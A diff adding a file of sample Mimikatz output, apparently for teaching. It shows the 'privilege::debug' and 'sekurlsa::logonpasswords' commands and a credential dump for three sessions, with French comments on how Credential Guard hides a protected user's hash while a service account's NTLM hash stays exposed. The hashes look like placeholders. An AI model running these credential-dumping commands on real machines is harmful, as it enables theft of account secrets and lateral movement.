@@ -1,0 +1,65 @@
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SYSTEM
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/30/2025 8:55:01 PM
+SID               : S-1-5-18
+  msv :
+    [00000003] Primary
+    * Username : SYSTEM
+    * Domain   : NT AUTHORITY
+    * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
+    * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+  wdigest :
+  kerberos :
+  ssp :
+
+Authentication Id : 0 ; 84587 (00000000:00014a6b)
+Session           : Interactive from 1
+User Name         : UtilisateurProtege
+Domain            : MON_DOMAINE
+Logon Server      : DC01
+Logon Time        : 5/30/2025 8:56:15 PM
+SID               : S-1-5-21-1234567890-987654321-111222333-1001
+  msv :
+    [00000003] Primary
+    * Username : UtilisateurProtege
+    * Domain   : MON_DOMAINE
+    * NTLM     : (null)  <-- Hachage NTLM non récupérable si Credential Guard est actif !
+    * SHA1     : (null)
+  tspkg :
+  wdigest :
+    * Username : UtilisateurProtege
+    * Domain   : MON_DOMAINE
+    * Password : (null) <-- Mot de passe en clair non récupérable
+  kerberos :
+    * Username : UtilisateurProtege
+    * Domain   : MON_DOMAINE
+    * Password : (null)
+  ssp :
+
+Authentication Id : 0 ; 84590 (00000000:00014a6e)
+Session           : Service from 0
+User Name         : svc_sql
+Domain            : MON_DOMAINE
+Logon Server      : (null)
+Logon Time        : 5/30/2025 8:58:00 PM
+SID               : S-1-5-21-1234567890-987654321-111222333-1005
+  msv :
+    [00000003] Primary
+    * Username : svc_sql
+    * Domain   : MON_DOMAINE
+    * NTLM     : 4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f <-- Hachage NTLM d'un compte de service
+    * SHA1     : fedcba9876543210fedcba9876543210fedcba9
+  tspkg :
+  wdigest :
+  kerberos :
+    * Username : svc_sql
+    * Domain   : MON_DOMAINE
+    * Password : (null)
